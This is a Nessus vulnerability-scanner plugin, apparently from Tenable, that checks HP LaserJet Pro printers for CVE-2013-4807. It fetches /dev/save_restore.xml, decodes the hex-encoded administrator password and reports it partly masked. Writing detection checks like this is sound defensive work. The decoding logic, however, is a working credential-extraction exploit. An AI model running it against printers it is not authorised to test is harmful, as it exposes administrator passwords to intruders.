#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69283);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 21:08:40 $");

  script_cve_id("CVE-2013-4807");
  script_bugtraq_id(61565);
  script_osvdb_id(95907);
  script_xref(name:"IAVB", value:"2013-B-0080");

  script_name(english:"HP LaserJet Pro /dev/save_restore.xml Administrative Password Disclosure");
  script_summary(english:"Attempts to obtain administrative password");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote printer is affected by an information disclosure
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote HP LaserJet Pro printer is affected by an information
disclosure vulnerability.  The file '/dev/save_restore.xml' contains a
hexadecimal representation of the administrative password.  This
information can be used by an attacker in further attacks."
  );
  # http://sekurak.pl/hp-laserjet-pro-printers-remote-admin-password-extraction/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a2726190");
  # Vendor advisory
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?08935147");
  script_set_attribute(attribute:"solution", value:
"Update the printer's firmware or disable file system access via the
Postscript interface.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/07/31");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/07/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/08/09");

  script_set_attribute(attribute:"cpe", value:"cpe:/h:hp:laserjet");
  script_set_attribute(attribute:"plugin_type", value:"remote");

  script_set_attribute(attribute:"stig_severity", value:"II");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("hp_laserjet_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/hp_laserjet/pname");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, dont_break:TRUE, embedded:TRUE);

url = '/dev/save_restore.xml';
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
pwd_str = "";

if (
  "<name>e_HttpPassword</name>" >!< res[2] &&
  "<name>e_cloudPrinterID</name>" >!< res[2] &&
  "<name>e_StatusLog</name>" >!< res[2]
) audit(AUDIT_WEB_APP_NOT_AFFECTED, "HP LaserJet Pro admin interface", build_url(port:port, qs:url));

variable_groups = split(res[2], sep:"</variable>", keep:FALSE);

foreach variable_group (variable_groups)
{
  if ("e_HttpPassword" >!< variable_group) continue;

  # We have the group which contains the pwd now
  marker = stridx(variable_group, "<value>");
  if (marker < 0) continue;
  pwd_str = substr(variable_group, marker);
  break;
}

# Here pwd_str has structure:
# <value>
#   hex-text representing password here (may contain NULLs)
# </value>
pieces = split(pwd_str);
if (isnull(pieces[1])) audit(AUDIT_WEB_APP_NOT_AFFECTED, "HP LaserJet Pro admin interface", build_url(port:port, qs:url));

# Convert hex-text to ascii and clean NULLs
pwd_raw = strip(chomp(pieces[1]));
pwd_ascii = hex2raw(s:pwd_raw);
len = strlen(pwd_ascii);

for (i=0; i<len; i++)
{
  if (pwd_ascii[i] != raw_string(0))
    pwd_txt += pwd_ascii[i];
  else
    break;
}

# Ensure we actually have something first
if (isnull(pwd_txt)) audit(AUDIT_WEB_APP_NOT_AFFECTED, "HP LaserJet Pro admin interface", build_url(port:port, qs:url));

# Mask password
len = strlen(pwd_txt);
if (len > 4)
  clean_pwd = substr(pwd_txt,0,1) + crap(data:"*", len - 4) + substr(pwd_txt, len - 2);
else
  clean_pwd = substr(pwd_txt,0,0) + "**" + substr(pwd_txt, len - 1);

if (report_verbosity > 0)
{
  report =
    '\n' +
    '\nNessus was able to verify the issue and obtain the administrative password : ' +
    '\n\n' +
    '\n  URL                     : ' + build_url(port:port, qs:url) +
    '\n  Administrative password : ' + clean_pwd +
    '\n';
  security_warning(port:port, extra:report);
}
else security_warning(port);
